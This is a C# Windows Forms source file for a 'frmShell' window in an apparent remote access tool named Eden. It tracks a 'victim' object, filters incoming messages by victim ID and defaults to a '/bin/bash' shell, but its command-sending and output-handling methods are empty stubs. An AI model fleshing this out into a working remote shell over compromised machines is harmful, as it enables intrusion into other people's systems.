using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmShell : Form
    {
        private clsVictim m_victim;
        public string m_szVictimID;

        private enum HistoryCmd
        {
            Previous,
            Next,
        }

        public frmShell(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnReceived(clsClient m_clnt, string szVictimID, string[] aszMsg)
        {
            try
            {
                if (!string.Equals(szVictimID, m_szVictimID))
                    return;

                if (aszMsg[0] == "shell")
                {
                    Invoke(new Action(() =>
                    {
                        
                    }));
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void fnInitCmd()
        {
            
        }

        private void fnSendCmdCommand(string szCmd)
        {

        }

        private void fnHistoryCmd(HistoryCmd history)
        {
            switch (history)
            {
                case HistoryCmd.Previous:

                    break;
                case HistoryCmd.Next:

                    break;
            }
        }

        void fnSetup()
        {
            //Controls
            StartPosition = FormStartPosition.CenterScreen;

            textBox1.Text = "/bin/bash";

            m_victim.m_clnt.ServerMessageReceived += fnReceived;

            fnInitCmd();
        }

        private void frmShell_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnInitCmd();
            }
        }
    }
}
